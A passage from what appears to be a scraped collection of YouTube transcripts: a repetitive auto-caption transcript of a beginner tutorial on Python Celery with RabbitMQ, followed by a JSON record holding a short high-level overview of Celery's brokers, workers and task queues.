a\nadditional software load by running a\nadditional software load by running a SMS related system or maybe you know\nSMS related system or maybe you know\nSMS related system or maybe you know WhatsApp messaging related system\nWhatsApp messaging related system\nWhatsApp messaging related system because it is not part of its score\nbecause it is not part of its score\nbecause it is not part of its score functionality and it doesn't needs to do\nfunctionality and it doesn't needs to do\nfunctionality and it doesn't needs to do in the real time it may be done in the\nin the real time it may be done in the\nin the real time it may be done in the near Real Time with some delay but it\nnear Real Time with some delay but it\nnear Real Time with some delay but it need not to be done in real time nor\nneed not to be done in real time nor\nneed not to be done in real time nor it's a condition to complete the\nit's a condition to complete the\nit's a condition to complete the transaction your transaction will be\ntransaction your transaction will be\ntransaction your transaction will be completed whether or not you receive the\ncompleted whether or not you receive the\ncompleted whether or not you receive the SMS and that's why these kind of systems\nSMS and that's why these kind of systems\nSMS and that's why these kind of systems have been developed and made use of the\nhave been developed and made use of the\nhave been developed and made use of the example I gave was a simple one but\nexample I gave was a simple one but\nexample I gave was a simple one but there are many other things suppose you\nthere are many other things suppose you\nthere are many other things suppose you don't want to write the logs in the\ndon't want to write the logs in the\ndon't want to write the logs in the current system itself because writing\ncurrent system itself because writing\ncurrent system itself because writing the log is a CPU and disk intensive job\nthe log is a CPU and disk intensive job\nthe log is a CPU and disk intensive job you want to transfer the locks to\nyou want to transfer the locks to\nyou want to transfer the locks to somewhere else to be written what if for\nsomewhere else to be written what if for\nsomewhere else to be written what if for any transaction you are transferring the\nany transaction you are transferring the\nany transaction you are transferring the metadata to somewhere else so that it\nmetadata to somewhere else so that it\nmetadata to somewhere else so that it can be checked whether the transaction\ncan be checked whether the transaction\ncan be checked whether the transaction is suspicious or normal okay so there\nis suspicious or normal okay so there\nis suspicious or normal okay so there are multitude of things which we don't\nare multitude of things which we don't\nare multitude of things which we don't want to do in the system where we are\nwant to do in the system where we are\nwant to do in the system where we are doing the actual core work which needs\ndoing the actual core work which needs\ndoing the actual core work which needs to be completed in real time we can\nto be completed in real time we can\nto be completed in real time we can Outsource all those things in some other\nOutsource all those things in some other\nOutsource all those things in some other system and from there the concept of\nsystem and from there the concept of\nsystem and from there the concept of task cues asynchronous task cues or\ntask cues asynchronous task cues or\ntask cues asynchronous task cues or distributed task cues or you know\ndistributed task cues or you know\ndistributed task cues or you know message cues or pops up architecture\nmessage cues or pops up architecture\nmessage cues or pops up architecture comes into picture now whatever software\ncomes into picture now whatever software\ncomes into picture now whatever software I had mentioned in the beginning like\nI had mentioned in the beginning like\nI had mentioned in the beginning like Apachi Kafka rabit mq some pops up\nApachi Kafka rabit mq some pops up\nApachi Kafka rabit mq some pops up architecture you can make use of all of\narchitecture you can make use of all of\narchitecture you can make use of all of them for this particular scenario or\nthem for this particular scenario or\nthem for this particular scenario or situations like this all of them will\nsituations like this all of them will\nsituations like this all of them will work\nwork\nwork perfectly but here in this particular\nperfectly but here in this particular\nperfectly but here in this particular video I want to introduce you to\nvideo I want to introduce you to\nvideo I want to introduce you to something which is pure python called\nsomething which is pure python called\nsomething which is pure python called celery and if you want to use celery\ncelery and if you want to use celery\ncelery and if you want to use celery it's not because it's better than other\nit's not because it's better than other\nit's not because it's better than other systems out there it may be not but it\nsystems out there it may be not but it\nsystems out there it may be not but it is pure Python and you know for most of\nis pure Python and you know for most of\nis pure Python and you know for most of the scenario for which you have created\nthe scenario for which you have created\nthe scenario for which you have created your python code python system it can\nyour python code python system it can\nyour python code python system it can work for you and work for you in the\nwork for you and work for you in the\nwork for you and work for you in the easiest possible way because if you are\neasiest possible way because if you are\neasiest possible way because if you are using salary you can make use of python\nusing salary you can make use of python\nusing salary you can make use of python ecosystem you don't need to learn a\necosystem you don't need to learn a\necosystem you don't need to learn a separate programming language to\nseparate programming language to\nseparate programming language to effectively use a particular system or\neffectively use a particular system or\neffectively use a particular system or learn a different kind of construct of\nlearn a different kind of construct of\nlearn a different kind of construct of using a particular system and that's why\nusing a particular system and that's why\nusing a particular system and that's why salary may be an option for you I'm not\nsalary may be an option for you I'm not\nsalary may be an option for you I'm not saying that go ahead and make use of the\nsaying that go ahead and make use of the\nsaying that go ahead and make use of the salary but I will always recommend you\nsalary but I will always recommend you\nsalary but I will always recommend you to have a look at it before making a\nto have a look at it before making a\nto have a look at it before making a decision now before I go further let me\ndecision now before I go further let me\ndecision now before I go further let me talk about the current version of celer\ntalk about the current version of celer\ntalk about the current version of celer which is 5.3 and it runs on python 3.8\nwhich is 5.3 and it runs on python 3.8\nwhich is 5.3 and it runs on python 3.8 and at the time of recording this video\nand at the time of recording this video\nand at the time of recording this video I request you to look at their website\nI request you to look at their website\nI request you to look at their website for latest information so whenever you\nfor latest information so whenever you\nfor latest information so whenever you are going to use salary you are going to\nare going to use salary you are going to\nare going to use salary you are going to use three things your program where your\nuse three things your program where your\nuse three things your program where your code is running the real program one\ncode is running the real program one\ncode is running the real program one task you in which you are going to\ntask you in which you are going to\ntask you in which you are going to transfer the things which you do not\ntransfer the things which you do not\ntransfer the things which you do not want to do in your program because of\nwant to do in your program because of\nwant to do in your program because of maybe CPU or memory or time overhead and\nmaybe CPU or memory or time overhead and\nmaybe CPU or memory or time overhead and third is a library implementation using\nthird is a library implementation using\nthird is a library implementation using salary which take things from your task\nsalary which take things from your task\nsalary which take things from your task q and executes the same so let's go\nq and executes the same so let's go\nq and executes the same so let's go ahead and see in here for this\nahead and see in here for this\nahead and see in here for this particular video I'm going to use rabbit\nparticular video I'm going to use rabbit\nparticular video I'm going to use rabbit mq as a task Q because it's the simplest\nmq as a task Q because it's the simplest\nmq as a task Q because it's the simplest one we can also use something else like\none we can also use something else like\none we can also use something else like RIS but that is something we are going\nRIS but that is something we are going\nRIS but that is something we are going to see in later videos let's use rabbit\nto see in later videos let's use rabbit\nto see in later videos let's use rabbit mq for Simplicity purpose and not only\nmq for Simplicity purpose and not only\nmq for Simplicity purpose and not only for Simplicity purpose for most of the\nfor Simplicity purpose for most of the\nfor Simplicity purpose for most of the work as far as I have\nwork as far as I have\nwork as far as I have experienced it works seamlessly so let's\nexperienced it works seamlessly so let's\nexperienced it works seamlessly so let's go ahead and make use of that so first\ngo ahead and make use of that so first\ngo ahead and make use of that so first what I will do is that I'll create the\nwhat I will do is that I'll create the\nwhat I will do is that I'll create the instance of rabbit mq using Docker so\ninstance of rabbit mq using Docker so\ninstance of rabbit mq using Docker so that my rabbit mq is up and running Let\nthat my rabbit mq is up and running Let\nthat my rabbit mq is up and running Let Me Wait it is yeah it is running now let\nMe Wait it is yeah it is running now let\nMe Wait it is yeah it is running now let me go ahead and check this by using\nme go ahead and check this by using\nme go ahead and check this by using Local Host and port number the username\nLocal Host and port number the username\nLocal Host and port number the username password by default is guest and\npassword by default is guest and\npassword by default is guest and guest you should change your password if\nguest you should change your password if\nguest you should change your password if you're making production use of it so\nyou're making production use of it so\nyou're making production use of it so this is my rabbit mq up and running\nthis is my rabbit mq up and running\nthis is my rabbit mq up and running working now I need to create cre a celer\nworking now I need to create cre a celer\nworking now I need to create cre a celer program using the celery Library which\nprogram using the celery Library which\nprogram using the celery Library which can take my task from this particular\ncan take my task from this particular\ncan take my task from this particular task CU and executes on the same so what\ntask CU and executes on the same so what\ntask CU and executes on the same so what I did is that I have created a small\nI did is that I have created a small\nI did is that I have created a small program you can see on your screen right\nprogram you can see on your screen right\nprogram you can see on your screen right now what I did is that I have imported\nnow what I did is that I have imported\nnow what I did is that I have imported celery from salery and I'm creating a\ncelery from salery and I'm creating a\ncelery from salery and I'm creating a app using the name of the module my file\napp using the name of the module my file\napp using the name of the module my file name is the module over here and a\nname is the module over here and a\nname is the module over here and a broker which is pqp\nbroker which is pqp\nbroker which is pqp amqp is advaned message queuing protocol\namqp is advaned message queuing protocol\namqp is advaned message queuing protocol pi means Python and by default it will\npi means Python and by default it will\npi means Python and by default it will make use of the rabbit mq in the port\nmake use of the rabbit mq in the port\nmake use of the rabbit mq in the port number that is being mentioned and now\nnumber that is being mentioned and now\nnumber that is being mentioned and now what I did over here is that I have\nwhat I did over here is that I have\nwhat I did over here is that I have created a task called task Q sorry for\ncreated a task called task Q sorry for\ncreated a task called task Q sorry for not following the python coding\nnot following the python coding\nnot following the python coding convention like task uncore Q all small\nconvention like task uncore Q all small\nconvention like task uncore Q all small but you know just for the Simplicity\nbut you know just for the Simplicity\nbut you know just for the Simplicity purpose I wanted to create a different\npurpose I wanted to create a different\npurpose I wanted to create a different function then the next function in a\nfunction then the next function in a\nfunction then the next function in a different way so I've created a task Q\ndifferent way so I've created a task Q\ndifferent way so I've created a task Q saying that the message that is received\nsaying that the message that is received\nsaying that the message that is received in this particular task you is this so\nin this particular task you is this so\nin this particular task you is this so it's as simple as that you don't need to\nit's as simple as that you don't need to\nit's as simple as that you don't need to do anything else and celery will take\ndo anything else and celery will take\ndo anything else and celery will take care of pretty much everything now I\ncare of pretty much everything now I\ncare of pretty much everything now I forgot to tell you that you need to\nforgot to tell you that you need to\nforgot to tell you that you need to install this cery it's not coming as\ninstall this cery it's not coming as\ninstall this cery it's not coming as part of the Python you need to install\npart of the Python you need to install\npart of the Python you need to install it separately okay so this is my simple\nit separately okay so this is my simple\nit separately okay so this is my simple salery code and I have created another\nsalery code and I have created another\nsalery code and I have created another client client here is my main program\nclient client here is my main program\nclient client here is my main program the program which was working right I\nthe program which was working right I\nthe program which was working right I don't want to execute the task over\ndon't want to execute the task over\ndon't want to execute the task over there okay so what I did is that I said\nthere okay so what I did is that I said\nthere okay so what I did is that I said from salary main import the function\nfrom salary main import the function\nfrom salary main import the function task q and I'm calling task you first\ntask q and I'm calling task you first\ntask q and I'm calling task you first task of the salary now what I will do is\ntask of the salary now what I will do is\ntask of the salary now what I will do is that this salary will be up and running\nthat this salary will be up and running\nthat this salary will be up and running in the background in a different machine\nin the background in a different machine\nin the background in a different machine right now it's running on my machine but\nright now it's running on my machine but\nright now it's running on my machine but in reality it will be running on a\nin reality it will be running on a\nin reality it will be running on a different machine so let me go ahead and\ndifferent machine so let me go ahead and\ndifferent machine so let me go ahead and start the salary now what I'm trying to\nstart the salary now what I'm trying to\nstart the salary now what I'm trying to do here is that I'm creating salary by\ndo here is that I'm creating salary by\ndo here is that I'm creating salary by using this particular command what I'm\nusing this particular command what I'm\nusing this particular command what I'm saying is that salary minus a Salan is\nsaying is that salary minus a Salan is\nsaying is that salary minus a Salan is the same module name worker log label as\nthe same module name worker log label as\nthe same module name worker log label as info I'm going to talk about worker in a\ninfo I'm going to talk about worker in a\ninfo I'm going to talk about worker in a moment let's see what happens right now\nmoment let's see what happens right now\nmoment let's see what happens right now now my salary is started okay it's\nnow my salary is started okay it's\nnow my salary is started okay it's actually running on my system now let me\nactually running on my system now let me\nactually running on my system now let me go back here and run this particular\ngo back here and run this particular\ngo back here and run this particular client now when I'm running this client\nclient now when I'm running this client\nclient now when I'm running this client look what is happening\nlook what is happening\nlook what is happening the task you first askas for salary is\nthe task you first askas for salary is\nthe task you first askas for salary is printed there which means it is not\nprinted there which means it is not\nprinted there which means it is not calling salary because I don't want to\ncalling salary because I don't want to\ncalling salary because I don't want to execute this particular function here\nexecute this particular function here\nexecute this particular function here the program should not be executed here\nthe program should not be executed here\nthe program should not be executed here it should be executed in my salary node\nit should be executed in my salary node\nit should be executed in my salary node and the print should be coming over here\nand the print should be coming over here\nand the print should be coming over here right to invoke salary you need to call\nright to invoke salary you need to call\nright to invoke salary you need to call the function in a different way saying\nthe function in a different way saying\nthe function in a different way saying the task.\nthe task.\nthe task. delay this is the way you are making\ndelay this is the way you are making\ndelay this is the way you are making sure that the call of this fun function\nsure that the call of this fun function\nsure that the call of this fun function goes to Rabbit mq and from rabbit mq\ngoes to Rabbit mq and from rabbit mq\ngoes to Rabbit mq and from rabbit mq celer will pick it up and executes the\nceler will pick it up and executes the\nceler will pick it up and executes the same remember you do not want this\nsame remember you do not want this\nsame remember you do not want this particular function to be executed here\nparticular function to be executed here\nparticular function to be executed here because it might take some time right so\nbecause it might take some time right so\nbecause it might take some time right so now if you go ahead and run this you can\nnow if you go ahead and run this you can\nnow if you go ahead and run this you can see there is no print out over here and\nsee there is no print out over here and\nsee there is no print out over here and if you go to celer you can see task you\nif you go to celer you can see task you\nif you go to celer you can see task you first task of the celer which means we\nfirst task of the celer which means we\nfirst task of the celer which means we have successfully transferred the\nhave successfully transferred the\nhave successfully transferred the execution of this particular function\nexecution of this particular function\nexecution of this particular function from this part particular place this\nfrom this part particular place this\nfrom this part particular place this particular process to some other process\nparticular process to some other process\nparticular process to some other process that is running and this is the idea\nthat is running and this is the idea\nthat is running and this is the idea behind task use now just to verify that\nbehind task use now just to verify that\nbehind task use now just to verify that let me you know stop this salary for a\nlet me you know stop this salary for a\nlet me you know stop this salary for a moment and what I'm going to do is that\nmoment and what I'm going to do is that\nmoment and what I'm going to do is that in the celer function let me add some\nin the celer function let me add some\nin the celer function let me add some sleep time do\nsleep time do\nsleep time do sleep let's say 5 seconds and after that\nsleep let's say 5 seconds and after that\nsleep let's say 5 seconds and after that I'm going to start this salary once\nI'm going to start this salary once\nI'm going to start this salary once again okay now when I'm going to run\nagain okay now when I'm going to run\nagain okay now when I'm going to run this particular client you can see that\nthis particular client you can see that\nthis particular client you can see that the client returns immediately the\nthe client returns immediately the\nthe client returns immediately the client execution is completed but this\nclient execution is completed but this\nclient execution is completed but this particular salary part after 5 Second\nparticular salary part after 5 Second\nparticular salary part after 5 Second which means when you are running the\nwhich means when you are running the\nwhich means when you are running the salary it is not impacting the execution\nsalary it is not impacting the execution\nsalary it is not impacting the execution of the process or the system from where\nof the process or the system from where\nof the process or the system from where it was triggered and this is what we\nit was triggered and this is what we\nit was triggered and this is what we wanted now let me talk about the most\nwanted now let me talk about the most\nwanted now let me talk about the most important aspect of salary which is you\nimportant aspect of salary which is you\nimportant aspect of salary which is you know something everyone must know and\nknow something everyone must know and\nknow something everyone must know and must understand okay so let me close\nmust understand okay so let me close\nmust understand okay so let me close this salary over here and in the CER\nthis salary over here and in the CER\nthis salary over here and in the CER main let me add one more you know task\nmain let me add one more you know task\nmain let me add one more you know task I'll say app. task I'll create another\nI'll say app. task I'll create another\nI'll say app. task I'll create another function saying that write you know\nlog and let me just print it over here\nlog and let me just print it over here writing uh\nlogs\nlogs format okay so I have created another\nformat okay so I have created another\nformat okay so I have created another task now look at that the first task\ntask now look at that the first task\ntask now look at that the first task sleeps for 5 minute sorry 5 seconds and\nsleeps for 5 minute sorry 5 seconds and\nsleeps for 5 minute sorry 5 seconds and there is another task over here and let\nthere is another task over here and let\nthere is another task over here and let me you know call this right lck task\nme you know call this right lck task\nme you know call this right lck task also from and you know from my client\nalso from and you know from my client\nalso from and you know from my client the lcks are\nthe lcks are\nthe lcks are here just so that we can see it now let\nhere just so that we can see it now let\nhere just so that we can see it now let me start the salary again let me clear\nme start the salary again let me clear\nme start the salary again let me clear it start my\nit start my\nit start my salary now when I'm running this\nsalary now when I'm running this\nsalary now when I'm running this particular client what will happen now\nparticular client what will happen now\nparticular client what will happen now this task q. delay it sleeps for 5\nthis task q. delay it sleeps for 5\nthis task q. delay it sleeps for 5 seconds what will happen what do you\nseconds what will happen what do you\nseconds what will happen what do you think will it sleep for 5 Second and\nthink will it sleep for 5 Second and\nthink will it sleep for 5 Second and then this right log will be printed\nthen this right log will be printed\nthen this right log will be printed let's go ahead and see the client will\nlet's go ahead and see the client will\nlet's go ahead and see the client will you know close immediately the client is\nyou know close immediately the client is\nyou know close immediately the client is done\ndone\ndone uh sorry I need\nuh sorry I need\nuh sorry I need to include over here there is one more\nto include over here there is one more\nto include over here there is one more mistake if I want to call salary I'll\nmistake if I want to call salary I'll\nmistake if I want to call salary I'll have to say delay why delay it's an\nhave to say delay why delay it's an\nhave to say delay why delay it's an indication to say that I am intending\nindication to say that I am intending\nindication to say that I am intending this for my rabbit mq so that selary can\nthis for my rabbit mq so that selary can\nthis for my rabbit mq so that selary can pick it up now you can see that this\npick it up now you can see that this\npick it up now you can see that this function will terminate immediately but\nfunction will terminate immediately but\nfunction will terminate immediately but in here you can see that the logs are\nin here you can see that the logs are\nin here you can see that the logs are here written first and this particular\nhere written first and this particular\nhere written first and this particular task Q first task of the salary what is\ntask Q first task of the salary what is\ntask Q first task of the salary what is happening are you getting something this\nhappening are you getting something this\nhappening are you getting something this is very interesting now python has a\nis very interesting now python has a\nis very interesting now python has a global interpreter lock which means only\nglobal interpreter lock which means only\nglobal interpreter lock which means only one thre can execute at any point of\none thre can execute at any point of\none thre can execute at any point of time now I do not want to confuse you\ntime now I do not want to confuse you\ntime now I do not want to confuse you with you know Global interpreter log let\nwith you know Global interpreter log let\nwith you know Global interpreter log let me talk about\nme talk about\nme talk about salary what happens that whenever you\nsalary what happens that whenever you\nsalary what happens that whenever you create an instance of salary it create\ncreate an instance of salary it create\ncreate an instance of salary it create the instance of of processes equivalent\nthe instance of of processes equivalent\nthe instance of of processes equivalent to number of CES in your\nto number of CES in your\nto number of CES in your system which means if I go ahead and see\nsystem which means if I go ahead and see\nsystem which means if I go ahead and see my htop over here let me see the\nmy htop over here let me see the\nmy htop over here let me see the htop and uh if I'm just searching\nhtop and uh if I'm just searching\nhtop and uh if I'm just searching salary you can see that I have 10 core\nsalary you can see that I have 10 core\nsalary you can see that I have 10 core MacBook M1 so 1 2 3 4 5 6 7 8 9 10 10\nMacBook M1 so 1 2 3 4 5 6 7 8 9 10 10\nMacBook M1 so 1 2 3 4 5 6 7 8 9 10 10 instances of celery is running which\ninstances of celery is running which\ninstances of celery is running which means it is doing parallel processing\nmeans it is doing parallel processing\nmeans it is doing parallel processing which which means in a particular\nwhich which means in a particular\nwhich which means in a particular machine if you just create one instance\nmachine if you just create one instance\nmachine if you just create one instance of salary which means it will be\nof salary which means it will be\nof salary which means it will be executed on all the course in a parallel\nexecuted on all the course in a parallel\nexecuted on all the course in a parallel manner how amazing right you don't need\nmanner how amazing right you don't need\nmanner how amazing right you don't need to do anything else anything for that\nto do anything else anything for that\nto do anything else anything for that matter to be able to make sure that it\nmatter to be able to make sure that it\nmatter to be able to make sure that it runs on all the code and that's why\nruns on all the code and that's why\nruns on all the code and that's why since it is running in parallel there\nsince it is running in parallel there\nsince it is running in parallel there was no sleep in this particular function\nwas no sleep in this particular function\nwas no sleep in this particular function so this particular function was called\nso this particular function was called\nso this particular function was called earlier and this was their sleep\nearlier and this was their sleep\nearlier and this was their sleep sleeping for you know 5 Seconds now just\nsleeping for you know 5 Seconds now just\nsleeping for you know 5 Seconds now just to verify that I can control how many\nto verify that I can control how many\nto verify that I can control how many instances of you know worker will Fork\ninstances of you know worker will Fork\ninstances of you know worker will Fork how many instances of celer by using a\nhow many instances of celer by using a\nhow many instances of celer by using a flag called minus minus\nflag called minus minus\nflag called minus minus concurrency so in here what I'm doing is\nconcurrency so in here what I'm doing is\nconcurrency so in here what I'm doing is that I'm calling minus minus\nthat I'm calling minus minus\nthat I'm calling minus minus concurrency equal to 1 let's see I'm\nconcurrency equal to 1 let's see I'm\nconcurrency equal to 1 let's see I'm saying one and I'm creating my salary\nsaying one and I'm creating my salary\nsaying one and I'm creating my salary over here if you go ahead head and see\nover here if you go ahead head and see\nover here if you go ahead head and see my htop you can see only one salary\nmy htop you can see only one salary\nmy htop you can see only one salary instance which is actually you know\ninstance which is actually you know\ninstance which is actually you know looking for the incoming messages from\nlooking for the incoming messages from\nlooking for the incoming messages from your rabbit mq so if I am going to run\nyour rabbit mq so if I am going to run\nyour rabbit mq so if I am going to run this particular code again you can see\nthis particular code again you can see\nthis particular code again you can see that you know it says that received in\nthat you know it says that received in\nthat you know it says that received in message queue but the sleep will take 5\nmessage queue but the sleep will take 5\nmessage queue but the sleep will take 5 seconds and only then this second\nseconds and only then this second\nseconds and only then this second function will be executed now if I make\nfunction will be executed now if I make\nfunction will be executed now if I make concurrency Edge 2 you can see that the\nconcurrency Edge 2 you can see that the\nconcurrency Edge 2 you can see that the existing Behavior will persist which\nexisting Behavior will persist which\nexisting Behavior will persist which means uh here more than one instance\nmeans uh here more than one instance\nmeans uh here more than one instance will be there and if I go ahead and run\nwill be there and if I go ahead and run\nwill be there and if I go ahead and run this particular code you can see that\nthis particular code you can see that\nthis particular code you can see that the you know locks are here is actually\nthe you know locks are here is actually\nthe you know locks are here is actually printed and then tasq is printed so this\nprinted and then tasq is printed so this\nprinted and then tasq is printed so this is the way you can maintain and manage\nis the way you can maintain and manage\nis the way you can maintain and manage concurrency now the question is can we\nconcurrency now the question is can we\nconcurrency now the question is can we have concurrency more than you know\nhave concurrency more than you know\nhave concurrency more than you know number of course I have in the system\nnumber of course I have in the system\nnumber of course I have in the system for example 20 well of course you can\nfor example 20 well of course you can\nfor example 20 well of course you can there is no limitation to this you can\nthere is no limitation to this you can\nthere is no limitation to this you can have that but how useful that will be\nhave that but how useful that will be\nhave that but how useful that will be for your system your work you need to\nfor your system your work you need to\nfor your system your work you need to take a call on that okay because there\ntake a call on that okay because there\ntake a call on that okay because there is no magic number I can tell you now\nis no magic number I can tell you now\nis no magic number I can tell you now there is one more thing why I am telling\nthere is one more thing why I am telling\nthere is one more thing why I am telling that salary is more reliable and it\nthat salary is more reliable and it\nthat salary is more reliable and it works in a reliable way for example\nworks in a reliable way for example\nworks in a reliable way for example assume as of now this celery is not\nassume as of now this celery is not\nassume as of now this celery is not working right I have closed it but what\nworking right I have closed it but what\nworking right I have closed it but what if I don't don't know from my system\nif I don't don't know from my system\nif I don't don't know from my system from my client which is connecting to\nfrom my client which is connecting to\nfrom my client which is connecting to celery whether celery is working or not\ncelery whether celery is working or not\ncelery whether celery is working or not it may very well be you know the network\nit may very well be you know the network\nit may very well be you know the network is not there or you know the system has\nis not there or you know the system has\nis not there or you know the system has crashed or something like that what will\ncrashed or something like that what will\ncrashed or something like that what will happen if I you know run this particular\nhappen if I you know run this particular\nhappen if I you know run this particular code I running this twice nothing\ncode I running this twice nothing\ncode I running this twice nothing happens at the client end so you will\nhappens at the client end so you will\nhappens at the client end so you will not get an error if the salary is not\nnot get an error if the salary is not\nnot get an error if the salary is not working what instead will happen is that\nworking what instead will happen is that\nworking what instead will happen is that your rabbit mq the Q will have these\nyour rabbit mq the Q will have these\nyour rabbit mq the Q will have these particular four items you can see that\nparticular four items you can see that\nparticular four items you can see that it will be there in the rabbit mq even\nit will be there in the rabbit mq even\nit will be there in the rabbit mq even if cellary is not running and when\nif cellary is not running and when\nif cellary is not running and when salary\nsalary\nsalary starts you know let's use it to when\nstarts you know let's use it to when\nstarts you know let's use it to when celer starts you can see that those\nceler starts you can see that those\nceler starts you can see that those things are processed here whenever celer\nthings are processed here whenever celer\nthings are processed here whenever celer starts and you can see that since there\nstarts and you can see that since there\nstarts and you can see that since there are only two concrete items are there\nare only two concrete items are there\nare only two concrete items are there that's why it took some time but all of\nthat's why it took some time but all of\nthat's why it took some time but all of these things are processed once sary has\nthese things are processed once sary has\nthese things are processed once sary has started and you can see in rabbit mq\nstarted and you can see in rabbit mq\nstarted and you can see in rabbit mq that it's being processed so in this\nthat it's being processed so in this\nthat it's being processed so in this particular way you can make sure that\nparticular way you can make sure that\nparticular way you can make sure that things are there it is not lost now the\nthings are there it is not lost now the\nthings are there it is not lost now the last thing I'm going to talk about\nlast thing I'm going to talk about\nlast thing I'm going to talk about returning the message from the salary\nreturning the message from the salary\nreturning the message from the salary now till the time we talked about you\nnow till the time we talked about you\nnow till the time we talked about you know we are transferring the execution\nknow we are transferring the execution\nknow we are transferring the execution of function from client to salary now I\nof function from client to salary now I\nof function from client to salary now I want to return the return value like\nwant to return the return value like\nwant to return the return value like whether the function executed\nwhether the function executed\nwhether the function executed successfully or not many time it happen\nsuccessfully or not many time it happen\nsuccessfully or not many time it happen right to the you know client how this\nright to the you know client how this\nright to the you know client how this can happen so to do this let me close\ncan happen so to do this let me close\ncan happen so to do this let me close this salary first what we need to do is\nthis salary first what we need to do is\nthis salary first what we need to do is that along with broker we need to give\nthat along with broker we need to give\nthat along with broker we need to give back end back end is the place where the\nback end back end is the place where the\nback end back end is the place where the results are stored okay so we'll be\nresults are stored okay so we'll be\nresults are stored okay so we'll be using RPC as of now for back end okay so\nusing RPC as of now for back end okay so\nusing RPC as of now for back end okay so what RPC does is that it uses the\nwhat RPC does is that it uses the\nwhat RPC does is that it uses the protocol to make sure that the return\nprotocol to make sure that the return\nprotocol to make sure that the return value is received by you so in here for\nvalue is received by you so in here for\nvalue is received by you so in here for example let me call return saying that Q\nexample let me call return saying that Q\nexample let me call return saying that Q done okay let me get rid of the slip\ndone okay let me get rid of the slip\ndone okay let me get rid of the slip there is no need for it now and here\nthere is no need for it now and here\nthere is no need for it now and here also uh\nalso uh\nalso uh logs written okay now let me start\nlogs written okay now let me start\nlogs written okay now let me start salary\nsalary\nsalary okay and in the client what I will do is\nokay and in the client what I will do is\nokay and in the client what I will do is that I'll just print the return value\nthat I'll just print the return value\nthat I'll just print the return value which means I'll say\nwhich means I'll say\nwhich means I'll say result uh\nresult uh\nresult uh equal to and I can print result do\nequal to and I can print result do\nequal to and I can print result do get and In Here Also I can just say\nget and In Here Also I can just say\nget and In Here Also I can just say print do get okay so if I go ahead and\nprint do get okay so if I go ahead and\nprint do get okay so if I go ahead and run this particular code you can see\nrun this particular code you can see\nrun this particular code you can see that Q done sorry let me run it again\nthat Q done sorry let me run it again\nthat Q done sorry let me run it again don't know what is happening you can see\ndon't know what is happening you can see\ndon't know what is happening you can see that Q done logs done are written over\nthat Q done logs done are written over\nthat Q done logs done are written over here so so this is the way you can\nhere so so this is the way you can\nhere so so this is the way you can transfer some return value to your\ntransfer some return value to your\ntransfer some return value to your calling program okay and in the get\ncalling program okay and in the get\ncalling program okay and in the get function you can give some time out you\nfunction you can give some time out you\nfunction you can give some time out you know that how much time it needs to wait\nknow that how much time it needs to wait\nknow that how much time it needs to wait for the return value to happen and if\nfor the return value to happen and if\nfor the return value to happen and if you don't give any time out if the\nyou don't give any time out if the\nyou don't give any time out if the function is taking time it is going to\nfunction is taking time it is going to\nfunction is taking time it is going to wait over here for example again the\nwait over here for example again the\nwait over here for example again the last example will be if I go ahead and\nlast example will be if I go ahead and\nlast example will be if I go ahead and you know again say time do\nyou know again say time do\nyou know again say time do sleep let's say 5 Seconds let me start\nsleep let's say 5 Seconds let me start\nsleep let's say 5 Seconds let me start salary\nsalary\nsalary again and at the client end what I will\nagain and at the client end what I will\nagain and at the client end what I will do is that I'm going to run it you can\ndo is that I'm going to run it you can\ndo is that I'm going to run it you can see that it is waiting it will wait for\nsee that it is waiting it will wait for\nsee that it is waiting it will wait for 5 second because get is a blocking call\n5 second because get is a blocking call\n5 second because get is a blocking call and after 5 Second things will be\nand after 5 Second things will be\nand after 5 Second things will be completed so this is the basic end to\ncompleted so this is the basic end to\ncompleted so this is the basic end to endend introduction to salary I do hope\nendend introduction to salary I do hope\nendend introduction to salary I do hope and believe that I explained the\nand believe that I explained the\nand believe that I explained the concepts to you in the easiest possible\nconcepts to you in the easiest possible\nconcepts to you in the easiest possible way and you can further explore this\nway and you can further explore this\nway and you can further explore this particular topic anyway I'm going to\nparticular topic anyway I'm going to\nparticular topic anyway I'm going to create more videos on this particular\ncreate more videos on this particular\ncreate more videos on this particular topic because salary is interesting\ntopic because salary is interesting\ntopic because salary is interesting thank you all thanks for watching we\nthank you all thanks for watching we\nthank you all thanks for watching we will meet again until the next time we\nwill meet again until the next time we\nwill meet again until the next time we meet good day goodbye you take care"
  },
  {
    "id": 60491642,
    "timestamp": "2026-02-23T00:14:53.725Z",
    "title": "Python Celery - high level overview",
    "url": "https://www.youtube.com/watch?v=hFIkEGtW6vE",
    "text": "Сelery is distributed task queue. Which means that&nbsp; you can offload your tasks on a separate machine.&nbsp;&nbsp;\nLet's take a look at example. We have an API&nbsp; endpoint which receives a request from a user and&nbsp;&nbsp;\ngenerates a CSV report. Generation of a CSV report&nbsp; takes a few seconds to complete which blocks our&nbsp;&nbsp;\nrequest response cycle. It makes our user to wait&nbsp; for a few seconds which is too slow for him and is&nbsp;&nbsp;\nmaking him annoyed. So, we would like to offload&nbsp; this task to a separate machine. We can introduce&nbsp;&nbsp;\ncelery. With celery we can create a task, then&nbsp; we can deploy this task on a different machine.&nbsp;&nbsp;\nFrom our main machine we can&nbsp; send a signal or a message&nbsp;&nbsp;\nwhich tells our second machine to start execution&nbsp; of this task. Communication between machines&nbsp;&nbsp;\nlies in a queue. They communicate using&nbsp; queue. Or broker. For example redis.&nbsp;&nbsp;\nAnd the second machine reads from this queue and&nbsp; starts execution of tasks described in the message.\nSoftware which provides such queue is called&nbsp; broker. Side which sends messages is called&nbsp;&nbsp;\nproducer. On the left side we use method delay&nbsp; which is not blocking our request response cycle.&nbsp;&nbsp;\nAnother side is called consumer. It consumes&nbsp; messages from the queue and starts execution&nbsp;&nbsp;\nof them. Celery works with different Brokers.&nbsp; For example -- redis, rabbitmq or maybe SQS.\nCelery is usually used to send emails,&nbsp; notifications or generate reports.&nbsp;&nbsp;\nIn general it is related to some kind of operation&nbsp; which blocks our main request response cycle.&nbsp;&nbsp;\nSomething that makes our client to&nbsp; wait and this is taking some time.\nCelery worker is a single instance of&nbsp; celery which is running on the machine.&nbsp;&nbsp;\nMain process reads from broker queue and&nbsp; distributes work across child processes.\nThese processes they are gathered in a pool and&nbsp; you can use different types of pools in celery.\nDistributed means that we can distribute our&nbsp; celery workers across several machines. Let's&nbsp;&nbsp;\nsay we have a lot of messages in our queue and one&nbsp; worker is not enough to process all the messages.&nbsp;&nbsp;\nNow we create several different machines and&nbsp; we deploy celery workers to these machines.&nbsp;&nbsp;\nWe distribute load between these&nbsp; workers. This is why celery is a&nbsp;&nbsp;\ndistributed task queue -- we can deploy&nbsp; several workers across multiple machines\nCelery can execute tasks at a specific time. To&nbsp; do that you should start celery beat instance. 